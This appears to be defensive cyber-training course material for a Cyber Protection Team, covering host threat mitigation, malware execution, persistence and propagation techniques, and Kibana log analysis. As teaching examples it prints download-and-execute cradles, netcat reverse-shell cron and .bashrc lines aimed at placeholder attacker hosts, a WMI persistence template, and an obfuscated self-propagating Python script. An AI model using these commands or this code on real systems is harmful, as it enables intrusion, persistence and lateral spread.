The detailed forensic investigation identified three primary security issues that led to the successful exploitation via the malicious PDF file. Table 21.4-2 describes the security issues. The Information Assurance (IA) office has also provided updated software to resolve, harden, and mitigate the exploitable security issues. Previous analysts have placed the software in the IA Software folder on the path C:\Users\trainee\Desktop.

﻿![image](https://github.com/user-attachments/assets/f68d09aa-9788-46c6-b984-8e42612dd214)

A threat mitigation operation has been ordered. While implementing threat mitigations are not typically done by a CPT, the client has requested the CPT aid in threat mitigation that preserves the environment. This involves accessing ls-wkstn-3 and addressing each of the security issues in Table 21.4-2. 




Mitigate Threats: Update Adobe Reader and Windows 10


Complete the steps in the following workflow to update Adobe Reader and Windows 10.


Workflow


1. Log in to the VM ls-wkstn-3 using the following credentials:

Username: trainee
Password: CyberTraining1! 



2. Access the IA Software folder on the path C:\Users\trainee\Desktop.


3. Select AcroRdrDC2200220191_en_US. Select Yes when prompted with Do you want to allow this app to make changes to your device?


The Adobe Acrobat Reader DC - Setup dialog box appears.


4. Select Continue, and select Install when prompted. 


Adobe executes its installation process. Once complete, the dialog box indicates that the installation was successful.


The new version of Adobe is now used when accessing PDF files. The update provides critical patches that prevent the adversary from using the malicious PDF file technique against the host. 


5. Access the IA Software folder on the path C:\Users\trainee\Desktop.


6. Select Windows10.0-KB4023057-x64. Select Run when prompted Do you want to run this file?


Allow 1 to 2 minutes for the installation to complete. When the dialog box disappears, the installation is complete. 


-----------------


Mitigate Threats: Enable Windows Defender
Complete the steps in the following workflow to continue threat mitigation operations by accessing the registry and enabling Windows Defender.

﻿

Workflow
﻿

1. On the taskbar, right-click Windows, select Run, enter regedit, and select Enter. This opens Registry Editor. 

﻿

2. In Registry Editor, navigate to the path HKLM\SOFTWARE\Policies\Microsoft\Windows Defender.

﻿

3. Right-click DisableAntiSpyware, and select Delete. 

﻿

By selecting Delete, the entry to disable Windows Defender (DisableAntiSpyware) is removed from the registry. Removing the entry enables Windows Defender to run on the host. Windows Defender provides anti-malware and security protocols to protect the host.

﻿

4. On the taskbar, select Windows. In the Windows System folder, select Windows Defender. 

﻿

5. Within Windows Defender, select Start Now.    

﻿

Figure 21.4-1 shows Windows Defender successfully active and running on the host:

﻿![image](https://github.com/user-attachments/assets/5812c1af-cbec-47fc-832a-f3f420954ea1)


----------------

Mitigate Threats: Enable Connectivity
Complete the steps in the following workflow to complete threat mitigation operations, bringing the host back into the operating environment by enabling network connectivity. 

﻿

Workflow
﻿

1. Open a new command prompt as an Administrator. 

﻿

2. Run the following command:


netsh interface set interface Ethernet0 enable
﻿

3. Run the following command to verify that the network connectivity has been restored:


netsh interface show interface
﻿

The following output is returned:﻿


Admin State    State          Type             Interface Name
-------------------------------------------------------------

Enabled        Connected      Dedicated        Ethernet0
﻿


The output verifies that the host has been successfully returned to the environment — the final step in the threat mitigation operation. The host is free from malware and now includes updates to heavily used software as well as an active anti-malware program. The host can resume operations within the environment. 

![image](https://github.com/user-attachments/assets/29259ffa-4aff-4901-9843-ad32126bb13b)


--------------

### CDAH-M22L1-Monitoring Malware Techniques on Host ###


Host-Based Malware Execution Techniques
Browser-Based Malware
﻿

Web browsers provide a rich target environment for malware developers, and both desktop and mobile browser platforms are affected. A common browser-based malware technique is the use of JavaScript (JS) as a stored Cross-Site Scripting (XSS) injected element. Upon visiting an infected website, a user is redirected to a site controlled by the attacker. In some cases, this results in the user’s downloading of unintended software, known as a drive-by download, or the attacker’s harvesting user credentials from a fake login form.

﻿

Social engineering, in general, is a means by which an attacker attempts to gain the trust of a target. Attackers who use social engineering to target web- or browser-based environments produce information such as websites or emails to coerce a user into selecting a malicious link or downloading an attachment containing malware.

﻿

Fileless Malware
﻿

Many people assume that malware requires an executable file located physically on the computer. This is a false assumption. If an attacker can gain remote access to a machine (such as through stolen credentials or a browser exploit), they can use file system utilities to download and execute follow-on malicious software without those files ever touching the disk. For example, the following PowerShell command downloads the malware.ps1 script and executes it using the Invoke-Expression command within the current PowerShell memory space:

Powershell.exe -ExecutionPolicy Bypass -NoProfile -NoExit -Command Invoke-Expression ((New-Object Net.WebClient).DownloadString('https://<Malicious Site>/malware.ps1'))
﻿

An attacker targeting a Linux platform can use a combination of Curl (or Wget) and the command pipe to achieve the same effect:

curl -k https://<Malicious Site>/malware | sh
﻿

Due to the repeated use of specific switches and options, using system commands to execute fileless malware results in Indicators of Compromise (IOC) for which a signature can easily be written. 

﻿

Linux exec Process Replacement
﻿

A Linux process list displays the processes currently running on the system. Normally, the name displayed is the same as the executable name. An attacker can take advantage of the -a switch of the exec command to mask their malware process name. The following example illustrates this concept.

﻿

Using the template below, an attacker creates a file called socket. Its purpose is to open a port and listen for connections, printing out a message upon success.


import socket
import sys

HOST = ""
PORT = 1337

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
s.bind((HOST, PORT))

except socket.error as msg:
print(f"Bind failed. Error Code : {msg[0]} - {msg[1]}")
sys.exit()
	
print("Socket bind complete")
s.listen(10)

conn, addr = s.accept()

print(f"Connected with: {addr[0]}, {addr[1]}")
﻿


When the program is executed, the process list looks like Figure 22.1-1, showing obvious malware:

﻿
<img width="600" height="83" alt="image" src="https://github.com/user-attachments/assets/5ac309d1-a083-43ad-9057-80b035809a8a" />


The attacker then chooses an appropriate process name for the system. Because this is a Virtual Machine (VM), the process name /usr/bin/vmtoolsd is selected and the socket template is renamed to vmusr to match similar processes. The process is executed with the following command:
exec -a "/usr/bin/vmtoolsd" python3 vmusr



Figure 22.1-2 shows the process list with hidden malware:

<img width="679" height="101" alt="image" src="https://github.com/user-attachments/assets/8174be62-7068-4eb4-bf9a-a2adbde1a87c" />


The new process disguises the Python 3 binary with the name /usr/bin/vmtoolsd. This method has its own issues. A careful examination of the netstat shows a listening port assigned to the masked process:

<img width="594" height="18" alt="image" src="https://github.com/user-attachments/assets/b923996e-746b-4850-82c9-61c979925b8d" />


Other Methods of Execution


More traditional forms of malware, such as Trojan horse applications, execute much like normal applications, but they have additional features that may be hidden from the user. One such feature is Dynamic Link Libraries (DLL) hijacking, which is the ability to hijack a system library by replacing it with a modified version of that library. The modification may allow an attacker to access a back door or bypass authentication completely.

-----------------

Analyze Malware Execution on Windows
A Cyber Protection Team (CPT) has been assigned to analyze a machine that an organization believes has been infected with malware. In this lab, which consists of three workflows, analyze how the malware executes, how the malware persists, and how the malware propagates.

﻿

Complete the steps in the following workflow to analyze the malware execution.

﻿

Workflow
﻿

1. Log in to the VM win-hunt with the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Launch the Procmon64.exe application from within the Process Monitor folder located on the desktop.

﻿

NOTE: The dialog box shown in Figure 22.1-4 appears if previous filters are present. Select OK if the dialog box appears.


<img width="592" height="364" alt="image" src="https://github.com/user-attachments/assets/e38d9357-e7e9-42fe-b032-ebdb6b6a2dad" />


3. Select Process Tree via the Tools menu option at the top of the window. Alternatively, enter Ctrl+T to open the same dialog box.


4. Inspect the process list for suspicious entries. Pay attention to parent–child relationships between processes, and determine if a relationship indicates a potentially malicious process.


The process list should appear similar to Figure 22.1-5:


<img width="674" height="50" alt="image" src="https://github.com/user-attachments/assets/eae05bbf-dbc8-4c1e-b4ff-1c28bb1da1c0" />


The figure shows that python.exe is a child of svchost.exe, which is not typically how python.exe is executed. (python.exe typically runs as a child of explorer.exe.) This may be the source of the malware.


5. Scroll across the columns until the Command column appears. The Python application above has the following command-line arguments:
C:\users\trainee\AppData\Local\Programs\Python\Python310\python.exe C:\Users\Trainee\AppData\Local\listen.py



6. Navigate to the location from which the Python script is being executed, and note the existence of the listen.py file.


The Python script cannot execute by itself. Recall from the process list that the Python script is a child process to svchost.exe. Typically, a process is a child of svchost.exe when run as a scheduled task. Open an Administrator PowerShell prompt, and issue the following command to find all running scheduled tasks:
Get-ScheduledTask | findstr "Running"



7. Rather than investigate each task individually, use the scripting capabilities within PowerShell to craft the following command:
Get-ScheduledTask | ForEach-Object { #1
    if ($_.state -eq "Running"){ #2
        $task = [System.String]::Concat($_.taskpath,$_.taskname) #3
        schtasks.exe /TN $task /FO list /v #4
    }
}



The command above performs the following (where #1, #2, #3, and #4 correspond to the lines in the command):


#1: Loops over each scheduled task.
#2: Checks to see if the current object ($_)  has a state of Running, meaning the scheduled task is currently running on the machine.
#3: Concatenates the task path, with the task name for the current running task. For instance, if the task is in the root directory, then its path is \, and if its name is MyTask, then the value of $task is \MyTask.
#4: Launches the schtasks.exe command and looks up the current task with its full path. The output is formatted into a list, with all arguments visible. This provides enough detail to find the malicious scheduled task.


The MSUpdater task is extremely suspicious and contains the task seen earlier in the ProcessMonitor process list.


The same task output also indicates what the schedule type is for this task. 


Use this workflow to answer the following question.
<img width="1266" height="662" alt="image" src="https://github.com/user-attachments/assets/85fc4607-909c-47c7-b150-71a055fbbf41" />


----------------


Host-Based Malware Persistence Techniques
Common Windows Persistence Techniques
﻿

Registry Entries
﻿

The Windows Registry provides a wealth of information about the host system and also provides a great vector for attackers to hide malicious activities. In particular, the following registry locations can be used to ensure that malware is executed each time the Operating System (OS) boots:

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce
﻿

Similar registry keys exist to launch specific software upon user login:

HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
﻿

Below is a non-exhaustive list of additional registry keys that malware often targets:

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services
HKEY_LOCAL_MACHINE\Software\Microsoft\WindowsNT\CurrentVersion\Winlogon\UserInit

HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Control\Session Manager\BootExecute
HKEY_CURRENT_USER\Software\Microsoft\WindowsNT\CurrentVersion\Winlogon\Shell
﻿

Windows Management Instrumentation Event Subscriptions
﻿

The Windows Management Instrumentation Command-Line (WMIC) service is a powerful utility that allows system administrators to gain deep insight into the Windows OS. The process of configuring a WMI object for persistence requires creating an event filter, creating an event consumer, and binding the two together: 


$FilterArgs = @{name='Windows-Updater';
                EventNameSpace='root\CimV2';
                QueryLanguage="WQL";
                Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"};
$Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs
 
$ConsumerArgs = @{name='Windows-Updater';
                CommandLineTemplate="C:\Windows\System32\msUp64.exe";}
$Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs
 
$FilterToConsumerArgs = @{
Filter = [Ref] $Filter;
Consumer = [Ref] $Consumer;
}
$FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs
﻿


Using the template above, an attacker can upload a malicious executable (msUp64.exe) and create a WMI event scheduler such that the provided executable image is executed within 5 minutes of the machine bootup. 

﻿

Common Linux Persistence Techniques
﻿

Crontab Entry
﻿

The Linux cron system is designed to execute scheduled jobs at specific intervals. Although the majority of these jobs are benign system administrator tasks, attackers can take advantage of cron to provide persistence for their malware.

﻿

An attacker might create the following cron job entry to execute a bind shell every day at 4 a.m.:

0 4 * * * nc -e /bin/bash <Attacker IP> <Attacker Port>

﻿

This cron executes the Netcat application every day at 4 a.m. and connects to the attacker’s listener using /bin/bash to send the shell. An attacker can modify the name of the application, which may not resemble Netcat or another known tool. The following command does the same thing as above, but the application name has been changed:

0 4 * * * /etc/sysinfo -e /bin/bash <Attacker IP> <Attacker Port>

﻿

By recognizing the command syntax for Netcat, the analyst can determine that /etc/sysinfo is, in fact, Netcat. Generally speaking, if an Internet Protocol (IP) address is present in a crontab entry, it should cause concern and be investigated.

﻿

Event-Based Execution
﻿

Linux OSs come with several files designed to set up the user environment upon login. Typically, the first profile loaded is the user’s Bourne Again Shell (Bash) .bashrc file, located in the user’s home directory. This file contains routines that are executed as soon as the user logs into their account. An attacker can leverage this by placing malicious code within the ~/.bashrc file. For example, consider the following snippet from a .bashrc file:

alias lsa='ls -la'
alias ll='ls -lart'
alias l='ls -l'
﻿

The above snippet sets up aliases for the ls command. However, if an attacker gained access to the user’s account and replaced those aliases with the following, they would be granted a remote shell any time the commands were run:

alias lsa='ls -la && /usr/bin/nc 123.123.123.123 1337'
alias ll='ls -lart && /usr/bin/nc 123.123.123.123 1337'
alias l='ls -l && /usr/bin/nc 123.123.123.123 1337'
﻿

Another location where an attacker could place an event-based execution mechanism is the system’s /etc/profile. This file is owned by root, so an attacker would need root access to be able to modify this file. If an attacker gained root access and made malicious modifications to this file, then any time any user logged into the machine, the malicious code would be executed.


---------------

Analyze Malware Persistence on Linux
As part of the investigation into the malware from the previous lab, evidence is discovered that a Linux host also serves as part of the Command and Control (C2) associated with the previously discovered malware. Complete the steps in the following workflow to analyze an event-based persistence mechanism.

﻿

Workflow
﻿

1. Log in to the VM kali-hunt with the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open a terminal window, and run the following command to investigate the .bashrc file:

cat ~/.bashrc
﻿

The following line in the .bashrc file is not a standard line and indicates a persistent malware infection:

exec -a "/usr/bin/vmtoolsd" /usr/bin/python3 /usr/vmusr&
﻿

The above line executes the Python interpreter but uses an option to make it appear in the process list as something that might look normal. It is located among many other lines of code, making it difficult to locate with casual browsing of the file contents.

﻿

Another way to identify potentially malicious software executing at startup is to issue the jobs command. This shows any jobs the user has backgrounded. In this case, the malware is being run in the background, so jobs uncovers it.

﻿

3. Execute the following command:

ps -ef | grep vmusr
﻿

Two processes have the name of vmtoolsd. One is the child of Process Identifier (PID) 1 and is a legitimate process, and the other is the masqueraded process that was run out of the .bashrc file.

﻿

Use this workflow to answer the following questions.
<img width="1037" height="246" alt="image" src="https://github.com/user-attachments/assets/ac6c05b2-5e31-4b66-ab48-20f6afbad9f9" />
<img width="1135" height="575" alt="image" src="https://github.com/user-attachments/assets/94cf8af3-a644-4ed2-8b9f-68f2f19c5036" />
<img width="1057" height="551" alt="image" src="https://github.com/user-attachments/assets/f9a5c15b-9591-4da0-a7d9-9ebd70d839f8" />


--------------

Host-Based Malware Propagation Techniques
For malicious software to infect a network, it must be able to propagate, or move, from host to host. The most common types of malware are viruses, Trojan horses, and worms. Each type has a different method of propagating.

﻿

Virus 
﻿

A virus is a program that propagates via removable media, email, or embedded code called macros. The virus executes when a user interacts with the infected application or email.

﻿

Trojan Horse
﻿

Trojan horse applications are malicious programs that propagate by masquerading as useful applications but that also contain code designed to steal information. A Trojan horse requires user interaction to execute but, once executed, can be controlled remotely.

﻿

Worm 
﻿

A worm is a type of malicious software that can self-replicate. Worms take advantage of system vulnerabilities to propagate and can copy themselves to other hosts across the network. They connect to a C2 server to build a network of infected machines known as a botnet to carry out large-scale Distributed Denial of Service (DDoS) attacks.

----------------

Analyze Malware Propagation
The previous two workflows have investigated some execution and persistence indicators of a piece of malware. Complete the steps in the final workflow to discover how this malware propagates across the network.

﻿

Workflow
﻿

1. Log in to the VM win-hunt with the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

As a reminder from a previous lab, the malicious scheduled task (MSUpdater) runs with the following arguments:

C:\users\trainee\AppData\Local\Programs\Python\Python310\python.exe C:\Users\Trainee\AppData\Local\listen.py
﻿

2. Navigate to the location listed, and open the listen.py script in Notepad to begin analyzing the script. This script provides substantial information, starting at the top:

HOST = "199.63.64.31"
PORT = b'MTMzNw=='
SERV = b'MTIzLjEyMy4xMjMuMTIz'
ID = b'MHhBQkFEQkVFRg=='
PRE_VALIDATE=[
b'bmV0c2ggYWR2ZmlyZXdhbGwgZmlyZXdhbGwgZGVsZXRlIHJ1bGUgbmFtZT0iVVBEQVRFUi1JTiI=',
b'bmV0c2ggYWR2ZmlyZXdhbGwgZmlyZXdhbGwgZGVsZXRlIHJ1bGUgbmFtZT0iQURWQU5DRUQgQ09NTVVOSUNBVElPTlMi']
net_hosts = []
﻿

The above snippet shows that the malware is obfuscated in some way. Additionally, an IP address is associated with the VM itself. Nothing in this section appears to be associated with the malware propagation.

﻿

3. Moving down the script, a block appears to be executing code on the VM. A connect function is being called, which could be an indication of malicious propagation. Note this, and continue the script analysis.

for opt in PRE_VALIDATE:
    os.popen(base64.b64decode(opt).decode())
  
    try:       
 os.popen(base64.b64decode(b'bmV0c2ggYWR2ZmlyZXdhbGwgZmlyZXdhbGwgYWRkIHJ1bGUgbmFtZT0iQURWQU5DRUQgQ09NTVVOSUNBVElPTlMiIGRpcj1vdXQgYWN0aW9uPWFsbG93IHByb3RvY29sPVRDUCBsb2NhbHBvcnQ9NDg5NDQ=').decode())
    except:
        pass  
    try:
    ns.connect((base64.b64decode(SERV).decode(),int(base64.b64decode(b'NDg5NDQ=').decode())))
        ns.sendall(base64.b64.decode(ID))
        ns.close()
    except:
        pass
   
    validate = b'bmV0c2ggYWR2ZmlyZXdhbGwgZmlyZXdhbGwgYWRkIHJ1bGUgbmFtZT0iVVBEQVRFUi1JTiIgZGlyPWluIGFjdGlvbj1hbGxvdyBwcm90b2NvbD1UQ1AgbG9jYWxwb3J0PTEzMzc='
    update = os.popen(base64.b64decode(validate).decode())
﻿

The next section of code looks quite promising. It starts off by checking the Address Resolution Protocol (ARP) cache and then initiates an Internet Control Message Protocol (ICMP) ping request to any hosts in the cache. The most interesting part of this block is near the end. A connect function is called that creates a network connection to any hosts that respond to the ICMP request. Then the send function is called, and the socket object is passed as an argument. 

    with os.popen('arp -a') as net:
        data = net.read()
        import re
        for line in re.findall('([-.0-9]+)\s+([-0-9a-f]{17})\s+(\w+)',data):
            net_hosts.append(line[0])
    for addr in net_hosts:
        with os.popen(f"ping -n 1  {addr}") as x:
            resp = x.read()
            for line in re.findall("Reply from", resp):
                try:
                    ns.connect((addr,int(base64.b64decode(b'MTMzNw==').decode())))
                    send(ns)
 
                except socket.error as e:
                    pass
﻿

The next code segment appears to set up a standard Python listening server socket:

    try:
        s.bind((HOST,int(base64.b64decode(b'MTMzNw==').decode())))
   
    except socket.error as msg:
        print(f"Bind Failed. Error Code: {msg}")
        s.close()
        sys.exit()
   
    s.listen()
    conn, addr = s.accept()
﻿

The final section contains the send function, and a file handle is opened. The file is then read line by line, and each line is sent through a network socket. This is likely the location of the propagation mechanism that the malware employs.

def send(s):
    fh = open(base64.b64decode(b'QzpcVXNlcnNcdHJhaW5lZVxBcHBEYXRhXExvY2FsXGxpc3Rlbi5weQ==').decode(),'r')
    for line in fh.readlines():
        try:
            s.sendall(base64.b64encode(line.encode()))
        except:
            s.close()
    s.close()
﻿

The references to the Base64 library indicate that portions of the script have been encoded using base64.b64encode and decoded using base64.b64decode. Recall the following variable from the beginning of the script:

ID = b'MHhBQkFEQkVFRg=='﻿

﻿

Many different methods may be used to decode this information, but the Python Integrated Development Environment (IDE) seems the simplest in this situation.

﻿

4. From the taskbar, select the Python Integrated Development and Learning Environment (IDLE) icon. Import the Base64 library, and call the b64decode function, passing the encoded string as an argument: 

<img width="646" height="74" alt="image" src="https://github.com/user-attachments/assets/d5661c91-3bc0-4626-b273-748d97fe2357" />

5. Select Enter, and discover that the ID variable stores the value 0xABADBEEF.


6. Use this process for the remaining Base64-encoded information in the script.


Use this workflow to answer the questions that foll ow.

<img width="1097" height="575" alt="image" src="https://github.com/user-attachments/assets/3e9acd20-4aad-497b-a3fd-70b049531a22" />

<img width="1115" height="521" alt="image" src="https://github.com/user-attachments/assets/12418657-4947-4933-8d3a-5761dd213e2e" />

<img width="1100" height="616" alt="image" src="https://github.com/user-attachments/assets/0344ad0f-fc2a-4b81-ba54-19b2e07f1093" />


------------------

### CDAH-M22L2-Monitoring Hosts for Malware Network Activity ###




Identifying Network-Based Malware Using Host Logs

A previous lesson focused on monitoring host logs to identify malicious activity local to an individual host. These logs can also be used to correlate events between hosts to identify malware communicating and propagating throughout the network. Doing so inherently requires logs from multiple hosts to compare against one another. Although it is possible to investigate each host’s logs individually, it is significantly more efficient to have hosts forward their logs to a centralized monitoring solution that helps correlate events. A Host Analyst needs to know what they are looking at when they receive such events and the basics of navigating the tools. Several centralized monitoring solutions exist; this lesson focuses on using Elastic Stack and Winlogbeat.

﻿

View Logs in Elastic Stack
﻿

Workflow
﻿

1. Open the Virtual Machine (VM) win-hunt. The login credentials are as follows:

Username: trainee
Password: CyberTraining1!
﻿

2. Open Chrome, and select the Security Onion bookmark.

﻿

3. Log in to the Security Onion dashboard using the following credentials:

Username: trainee@jdmss.lan
Password: CyberTraining1!
﻿

4. On the Getting Started page, select the hamburger menu icon, and select Kibana under Tools on the left menu.

﻿

5. Log in to Elastic with the following credentials:

Username: trainee@jdmss.lan
Password: CyberTraining1!
﻿

6. Access the Discover dashboard by selecting the hamburger menu icon in the top left corner of the home screen and selecting the Discover menu option.

﻿

The Kibana event dashboard collects information from multiple sources, such as Security Onion modules, Logstash, and Winlogbeat. Kibana refers to each of these as an index pattern. The pattern for Security Onion is *:so-*. 

﻿

7. Change the index pattern to *:winlogbeat-*, and display the Windows Event Log data stored on the server.

﻿

Kibana allows for the ability to focus on a particular time range. 

﻿

8. In order to view the necessary events, set the date for Kibana to the absolute date range from September 16th, 2022 at 0900 to September 16th, 2022 at 1300, then select Update

<img width="607" height="84" alt="image" src="https://github.com/user-attachments/assets/2ff5a9a5-a7a5-4767-9303-cebc61e31c69" />

The options on the left side of the User Interface (UI) allow for filtering of the Kibana log output for such elements as specific host names, port numbers, and event log identifiers (ID). 


9. Select the host.name filter to see which host is responsible for the logging:

<img width="551" height="203" alt="image" src="https://github.com/user-attachments/assets/a875c2c5-07dc-4518-a34e-28babe6f2e74" />


The host win-hunt is responsible for the logs.


10. Open a command prompt window, and examine the listening ports with the following command:
netstat -anotp tcp | findstr LISTEN



11. Inspect the list for unusual listening ports. Make a note of the far right column, which provides the Process ID (PID) associated with the listening port. For any suspicious ports, execute the following command to view the process associated with that ID:
tasklist | findstr <PROCESSID>



Keep all VMs and tools open, as they are used in the next workflow. Answer the following questions.

<img width="1225" height="390" alt="image" src="https://github.com/user-attachments/assets/5a9be655-8711-46f6-9e6e-f50f439e7642" />
<img width="1060" height="538" alt="image" src="https://github.com/user-attachments/assets/57fbad8d-a821-4739-89ac-1f778e5831b4" />
<img width="1117" height="511" alt="image" src="https://github.com/user-attachments/assets/616d26f6-f6a1-4ce3-a541-d89bb78c6902" />


--------------------------

Monitoring for Malicious Network Behavior
Inherently, network-based malware, which is malicious software that spreads and infects systems through network connections, must communicate with the network. This occurs in several ways, and each method has a different purpose and different behavior to look for.
﻿

﻿

Command and Control
﻿

Malware is useful to an attacker only if it can be communicated with. The breadth of communication techniques between an attacker and malware is referred to as Command and Control (C2). This can take many forms, but all the forms have a few things in common.

﻿

C2 communications are generally relatively consistent compared to other malicious network traffic. C2 traffic almost always must reach out to the internet at some point. When this external traffic occurs and where it goes always have a pattern. The timing and destination may not be completely consistent, as good Operational Security (OPSEC) typically has several C2 servers for malware to alternate between and has some variance in how often the malware connects. However, by correlating events across a network, it is possible to identify such behavior as connections to the same set of Internet Protocol (IP) addresses on a roughly 4-hour basis.

﻿

The behavior after the initial communication is also often easy to profile. If malware beacons approximately every 4 hours, monitoring would likely show these heartbeat-style connections followed by subsequent connections that relay instructions from the C2 server to the malware and connections from the malware to the C2 server containing exfiltrated data. Periods of extended connection may also occur as an attacker decides to interact directly with the malware, via a remote access tool, for example.

﻿

A few popular protocols used by C2 frameworks are as follows:


Hypertext Transfer Protocol/Hypertext Transfer Protocol Secure (HTTP/HTTPS)

File Transfer Protocol (FTP)

Domain Name System (DNS)

Internet Relay Chat (IRC)

Server Message Block (SMB)


C2 communication occurs over a variety of protocols that is too wide to list. It is more important to profile the behavior of the communications themselves and identify anomalies, such as protocols, that are otherwise unused in the network or machines reaching out to the internet when they have no reason to do so.

﻿

Port Scanning and Network Enumeration
﻿

Network-based malware is often used as a foothold to explore the rest of the network before moving laterally. Monitoring often reveals malware performing port scans and network enumeration to identify other hosts and potentially vulnerable services on the network. This most often takes the form of hundreds or thousands of connections to a variety of IPs and ports over a short period of time. Savvy attackers may severely limit the number of connections made over time or constrict the ports being scanned to commonly used services to avoid being obvious, but the actual data contained in the traffic is often easy to detect. For example, Nmap, by default, attempts to avoid logging by never completing the Transmission Control Protocol (TCP) handshake. Many hosts do not log incomplete connections by default, but it is possible to configure hosts to do so or to generate an alert when they have a high number of incomplete connections. Many applications already have rules built in to generate alerts or events based on popular scanning tools and techniques.

﻿

These activities can be found in any logs that note network connections. The default Windows Event Logs can be configured to log network connections. However, such tools as Sysmon and Zeek are significantly more robust and can be configured to log a variety of different behaviors rather than every network connection and to include information not included in the default Windows Event Logs.


----------

Analyze Malicious Network Execution

With the new evidence and location of the malicious script, it is important to look for details related to any C2 or other malicious activities that may be executing. Complete the steps in the following workflow to analyze the script for malicious network execution.

﻿

NOTE: The VM win-hunt, Security Onion, and Elastic Stack should be open from the prior workflow. If they are not, use the following credentials to open them:

﻿

win-hunt﻿

Username: trainee
Password: CyberTraining1!
﻿

Security Onion and Elastic﻿

Username: trainee@jdmss.lan
Password: CyberTraining1!
﻿

Workflow
﻿

1. Set the date range for Kibana from September 16, 2022 @ 09:00 to September 16, 2022 @ 13:00.

﻿

2. Show event logs related to scheduled jobs by using the following search filter:

(event.code:"4701" or event.code:"4702" or event.code:"4703")

﻿

3. Finally, filter out all of the scheduled tasks related to Microsoft Windows by appending the following to the search filter:

 and (NOT "\Microsoft\*")
﻿

The full Kibana query should now read:

(event.code:"4701" or event.code:"4702" or event.code:"4703") and (NOT "\Microsoft\*")
﻿

Keep all VMs and tools open, as they are used in the next workflow. Answer the following question.

<img width="1095" height="561" alt="image" src="https://github.com/user-attachments/assets/929fc9cd-8fd1-4d08-bd02-7691918eeedc" />


---------------

Persistence for Network-Based Malware
As mentioned earlier, malware is not of much use to an attacker if they cannot communicate with it. In the same way that malware must find a way to persist on the host, it must also have some mechanism to be persistently reachable over the network. The section about C2 touched on such concepts as beaconing, but other ways exist for malware to persist on the network. These include methods of staying hidden, as malware cannot persist if it is caught. To accomplish persistence, network malware relies on two broad attack vectors: external services and traffic signaling.

﻿

External Services
﻿

An attacker must have some way to communicate with the malware inside a network. This is accomplished by abusing an external service, and it can go in either direction. For example, beacons out to the internet frequently go over HTTPS because most traffic leaving the network is HTTPS traffic from users browsing the public internet. This helps the beacons blend in. However, traffic also often flows into the network via other protocols. 

﻿

HTTPS traffic may come in if the network hosts a public web server, but that traffic should rarely make it further in than the Demilitarized Zone (DMZ). On the other hand, with more people working remotely, more companies have had to leverage remote access technologies and protocols, such as Virtual Private Networks (VPN) and Secure Shell (SSH). 

﻿

Attackers can communicate with their malware over these protocols and take advantage of being allowed through the firewall. Usually, this involves the attacker’s providing the expected packet headers for their chosen protocol while disguising their commands and communications within other parts of the packet. 

﻿

Manipulated TCP flags and abnormally large packets are common signs of disguised C2 communication. An attacker’s creativity really is the limit for how to go about this. VPNs and SSH are common targets, but other examples seen in the wild include Windows Remote Management (WinRM), Virtual Network Computing (VNC), and Docker and Kubernetes (K8s) Application Programming Interfaces (API). Anything that touches outside the network or subnet is a potential access vector.

﻿

External services do not have to be limited to services that touch the internet, however. Just as protections are in place to separate a network from the internet, internal boundaries separate different departments or separate servers from users. Malware must also find ways to circumvent these barriers using services external to their subnet. A common example is Cobalt Strike agents. Some agents may call out to the internet over HTTPS to communicate with the C2 server, but not every computer in a network can touch the internet. Even if a computer can do so, an attacker probably does not want every agent beaconing out to the same external host with a very noticeable pattern. In this case, the recommendation is to establish a chain of agents that forward traffic for each other. HTTPS might not be allowed to leave some subnets, but it is quite common to allow SMB through a firewall to reach such services as file servers. Agents can be configured to use an SMB listener to communicate with one another, so the agents that cannot reach the internet send their traffic over SMB to agents that can, which, in turn, send that traffic out via HTTPS. This is still a case of abusing an external service, as the malware is leveraging an otherwise-legitimate channel that must be externally exposed.

﻿

Traffic Signaling
﻿

The lesson has mentioned that such anomalies as strange packet flags and options or abnormally large packets may be signs of malware running over otherwise-legitimate services. (Rely on your baseline to determine the expected packet sizes in the network being analyzed.) This is a form of traffic signaling. Traffic signaling is any technique that manipulates traffic in a specific way to communicate with malware. The packet might include a magic number that the malware is programmed to respond to in some way, such as beaconing out or spawning a listener that the attacker can connect to. ﻿

﻿

Another traffic signaling technique is port knocking, in which the attacker sends a series of specific packets in a particular order that mimics a secret door knock. These packets might contain a series of magic numbers, or they might just be sent to a series of specific high-port numbers. There are a few ways this could be implemented. One such way is to send a single SYN packet to a list of random high ports, one at a time, in a specific order. Once that order has been observed by the malware, a fourth random high port is opened and listens for an inbound connection. Any deviation from the specific ports would cause the listening port to remain closed. 

﻿

﻿Port stealing is also related to traffic signaling. For example, a target system may allow only SSH traffic through the firewall. An attacker manages to install malware on the system and has it listen on some random high port, such as 31337. Obviously, the firewall does not allow traffic to port 31337, so the attacker installs a firewall rule that redirects any SSH traffic from a specific source port, such as 54321, to localhost:31337. As long as the attacker communicates specifically from port 54321, the traffic reaches the malware. 

﻿

Traffic signaling may also be accomplished by the malware’s listening for the traffic at a lower layer of the Open Systems Interconnection (OSI) model than the firewall. For example, an attacker with root privileges may install a rootkit that uses a raw socket to listen for traffic on Layer 2, Data Link. Since iptables, a common firewall solution for UNIX systems, works at Layers 3 and higher, the rootkit sees the traffic before the firewall drops the packets. Although the rootkit cannot continue to communicate in this manner, it may be signaled to beacon out to the attacker.

﻿

